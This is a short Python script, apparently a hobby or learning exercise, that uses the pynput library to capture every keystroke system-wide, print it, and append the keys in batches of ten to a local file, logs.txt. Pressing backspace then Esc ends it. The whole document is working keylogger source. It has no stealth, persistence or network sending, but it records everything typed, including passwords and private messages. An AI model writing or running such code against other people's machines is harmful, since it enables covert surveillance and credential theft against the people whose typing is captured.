import pynput
from pynput.keyboard import Key, Listener 

count,klist,prev=0,[],""

def on_press(key):
    global count,klist
    print("{0} pressed".format(key))
    count+=1
    klist.append(key)
    if count==10:
        wfile(klist)
        count=0
        klist=[]
def wfile(klist):
    with open("logs.txt",'a') as f:
        for p in klist:
            k=str(p).replace("'","")
            if k.find('space')!=-1:
                f.write("\n")
            else:
                f.write(k)
    

def on_release(key):
    global prev
    if prev==Key.backspace and key==Key.esc:
        return False
    prev=key



with Listener(on_press=on_press, on_release=on_release) as Listener:
    Listener.join()
